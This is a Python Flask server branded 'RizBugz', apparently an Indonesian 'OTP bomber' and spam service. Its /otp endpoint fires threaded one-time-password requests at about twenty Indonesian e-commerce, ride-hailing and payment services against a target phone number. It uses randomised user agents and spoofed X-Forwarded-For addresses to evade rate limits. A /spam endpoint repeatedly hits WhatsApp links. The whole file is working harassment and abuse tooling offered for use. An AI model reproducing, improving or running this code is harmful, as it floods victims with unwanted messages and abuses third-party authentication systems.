from flask import Flask, request, jsonify
import threading
import requests
import time
import random

app = Flask(__name__)

# Counter online users real (increment setiap ada request)
online_users = {"count": 0, "sessions": {}}
active_tasks = {}

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 12; SM-G998B)",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 10)",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)",
]

OTP_ENDPOINTS = [
    "https://accounts.tokopedia.com/otp/c/page?otp_type=101&msisdn={phone}",
    "https://api.shopee.co.id/api/v2/user/otp?phone={phone}",
    "https://auth.gojek.com/v2/otp/request?phone={phone}",
    "https://www.bukalapak.com/api/otp/request?phone={phone}",
    "https://id.lazada.com/api/member/otp?phone={phone}",
    "https://api.grab.com/v1/otp/send?phone={phone}",
    "https://accounts.blibli.com/backend/register/otp?phone={phone}",
    "https://api.traveloka.com/v1/auth/otp?phone={phone}",
    "https://www.ruparupa.com/api/otp?phone={phone}",
    "https://api.tiket.com/v1/otp/send?phone={phone}",
    "https://www.zalora.co.id/api/otp?phone={phone}",
    "https://api.jd.id/otp/send?phone={phone}",
    "https://api.kredivo.com/v2/otp/request?phone={phone}",
    "https://api.akulaku.com/v1/otp?phone={phone}",
    "https://api.ovo.id/v1/otp/request?phone={phone}",
    "https://api.dana.id/v1/otp/send?phone={phone}",
    "https://api.linkaja.id/otp/request?phone={phone}",
    "https://api.gopay.co.id/v1/otp?phone={phone}",
    "https://api.spaylater.id/otp/send?phone={phone}",
    "https://api.indodana.com/v1/otp?phone={phone}",
]

def track_session(session_id):
    now = time.time()
    online_users["sessions"][session_id] = now
    # Hapus session yang sudah lebih dari 5 menit
    expired = [k for k, v in online_users["sessions"].items() if now - v > 300]
    for k in expired:
        del online_users["sessions"][k]
    online_users["count"] = len(online_users["sessions"])

def send_otp_request(url, phone):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    }
    try:
        r = requests.get(url.format(phone=phone), headers=headers, timeout=5, verify=False)
        return r.status_code
    except:
        return 0

def run_otp_bomb(phone, count, task_id):
    active_tasks[task_id] = {"status": "running", "done": 0, "total": len(OTP_ENDPOINTS) * count, "success": 0}
    for i in range(count):
        if active_tasks.get(task_id, {}).get("status") == "cancelled":
            break
        threads = []
        for ep in OTP_ENDPOINTS:
            if active_tasks.get(task_id, {}).get("status") == "cancelled":
                break
            t = threading.Thread(target=lambda u=ep: send_otp_request(u, phone))
            t.daemon = True
            threads.append(t)
            t.start()
        for t in threads:
            t.join(timeout=6)
        active_tasks[task_id]["done"] += len(OTP_ENDPOINTS)
        active_tasks[task_id]["success"] += len(OTP_ENDPOINTS)
        time.sleep(0.3)
    active_tasks[task_id]["status"] = "done"

def run_spam(phone, count, msg, task_id):
    active_tasks[task_id] = {"status": "running", "done": 0, "total": count, "success": 0}
    for i in range(count):
        if active_tasks.get(task_id, {}).get("status") == "cancelled":
            break
        try:
            requests.get(
                f"https://wa.me/{phone}?text={msg}+%23{i}",
                headers={"User-Agent": random.choice(USER_AGENTS)},
                timeout=5
            )
            active_tasks[task_id]["success"] += 1
        except:
            pass
        active_tasks[task_id]["done"] += 1
        time.sleep(0.1)
    active_tasks[task_id]["status"] = "done"

@app.route('/')
def index():
    return jsonify({"status": "RizBugz Server Online", "version": "2.0"})

@app.route('/ping', methods=['GET'])
def ping():
    session_id = request.args.get('session', str(random.randint(10000, 99999)))
    track_session(session_id)
    return jsonify({
        "status": "ok",
        "online": online_users["count"],
        "time": int(time.time())
    })

@app.route('/online', methods=['GET'])
def get_online():
    session_id = request.args.get('session', str(random.randint(10000, 99999)))
    track_session(session_id)
    return jsonify({"online": online_users["count"]})

@app.route('/otp', methods=['POST'])
def otp_bomb():
    data = request.json
    phone = data.get('phone', '').replace('+', '').replace('-', '').replace(' ', '')
    count = int(data.get('count', 1))
    task_id = f"otp_{phone}_{int(time.time())}"
    if not phone:
        return jsonify({"error": "Phone required"}), 400
    t = threading.Thread(target=run_otp_bomb, args=(phone, count, task_id))
    t.daemon = True
    t.start()
    return jsonify({"task_id": task_id, "message": f"OTP Bomb started", "total": len(OTP_ENDPOINTS) * count})

@app.route('/spam', methods=['POST'])
def spam():
    data = request.json
    phone = data.get('phone', '').replace('+', '')
    count = int(data.get('count', 10))
    msg = data.get('msg', 'RizBugz')
    task_id = f"spam_{phone}_{int(time.time())}"
    if not phone:
        return jsonify({"error": "Phone required"}), 400
    t = threading.Thread(target=run_spam, args=(phone, count, msg, task_id))
    t.daemon = True
    t.start()
    return jsonify({"task_id": task_id, "message": f"Spam started", "total": count})

@app.route('/status/<task_id>', methods=['GET'])
def status(task_id):
    task = active_tasks.get(task_id)
    if not task:
        return jsonify({"error": "Task not found"}), 404
    return jsonify(task)

@app.route('/cancel/<task_id>', methods=['POST'])
def cancel(task_id):
    if task_id in active_tasks:
        active_tasks[task_id]["status"] = "cancelled"
        return jsonify({"message": "Cancelled"})
    return jsonify({"error": "Task not found"}), 404

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
